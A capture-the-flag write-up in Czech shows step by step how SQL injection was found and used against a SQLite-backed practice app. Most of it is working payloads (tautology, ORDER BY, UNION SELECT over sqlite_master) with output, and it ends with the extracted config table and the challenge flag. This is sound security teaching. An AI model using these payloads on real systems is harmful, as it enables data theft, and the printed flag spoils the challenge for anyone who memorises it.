# SQL Injection Write-up

## Průzkum

Nejprve jsem otestoval vstupní pole zadáním znaku:

```
'
```

Aplikace vrátila chybu:

```
SQL Chyba: unrecognized token: "'"
```

To znamená, že vstup není ošetřen a je přímo vložen do SQL dotazu → aplikace je zranitelná na SQL Injection.

Dále jsem použil payload:

```
' OR '1'='1
```

Po URL encodingu:

```
%27%20OR%20%271%27%3D%271
```

Výsledkem bylo vypsání všech uživatelů → potvrzení SQL Injection.

---

## Zjištění struktury

Pomocí ORDER BY jsem zjistil počet sloupců:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Při hodnotě 3 došlo k chybě:

```
1st ORDER BY term out of range - should be between 1 and 2
```

=> Dotaz má 2 sloupce

---

## UNION SELECT test

Ověření:

```
' UNION SELECT 1,2--
```

Výstup:

```
Uživatel: 1 | Pozice: 2
```

=> Oba sloupce se zobrazují

---

## Výpis tabulek

Použil jsem SQLite systémovou tabulku:

```
' UNION SELECT name,NULL FROM sqlite_master--
```

Nalezené tabulky:

* users
* config

---

## Zjištění struktury tabulky

```
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='config'--
```

Výsledek:

```
CREATE TABLE config (key TEXT, value TEXT)
```

---

## Exfiltrace dat

```
' UNION SELECT key,value FROM config--
```

Výsledek:

```
admin_email | admin@skola.cz
flag | FLAG{Sql_Un1on_M4st3r_S0SE}
```

---

## Závěr

Aplikace je zranitelná na SQL Injection kvůli neošetřenému vstupu.
Pomocí UNION SELECT bylo možné získat citlivá data včetně vlajky.

Vlajka:

```
FLAG{Sql_Un1on_M4st3r_S0SE}
```
Jsem Sigma 
